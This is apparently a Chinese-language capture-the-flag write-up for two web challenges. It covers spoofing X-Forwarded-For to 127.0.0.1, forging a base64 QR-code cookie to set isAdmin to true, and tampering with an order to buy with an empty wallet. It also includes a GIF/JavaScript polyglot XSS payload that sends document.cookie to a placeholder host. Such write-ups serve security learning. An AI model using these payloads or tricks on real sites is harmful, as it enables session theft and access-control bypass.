## [Web] Kobe System    [20]先查看 robots.txt 會發現應該是 flag 在的位置直接連過去看會出現 ``只允許管理者``修改 http header X-Forwarded-For 偽造來源 IP 為 ``127.0.0.1``cookie 部分看起來應該是 base64 解出來是個 QRcodeQRcode 的內容為 ``{isAdmin:false}`` 把 ``flase`` 改成 ``true`` 重新做一個 QRcode 再用 base64 加密這樣再回去看應該可以得到 Flag 了## [Web] BaNanA Store 2.0 [30]
猜一下網址 ``/admin/`` 會發現這應該是我們要找的目標
訂購頁面確認金額的部分只是簡單驗證個數乘上金額會 ≤ 錢包金額
因為錢包金額是 0 元，所以要修改送出去的資料讓我這個錢包沒錢的人可以買手機 QQ
XSS 的時候會發現有 CSP 保護，但是他只 allow ``i.imgur.com`` 這個
所以利用 imagejs 將 script 轉換成圖片上傳基本上就可以得到 cookies 了
```
GIF89a/* 0  ;*/=0;
window.location.href="http://YourIP/steal.gif?cookie=" + document.cookie;```
然後不知道為什麼 papa 號這題一直拿不到 cookie  ... 
花了大概一個多小時在研究這個，結果換台機器就好了 QQ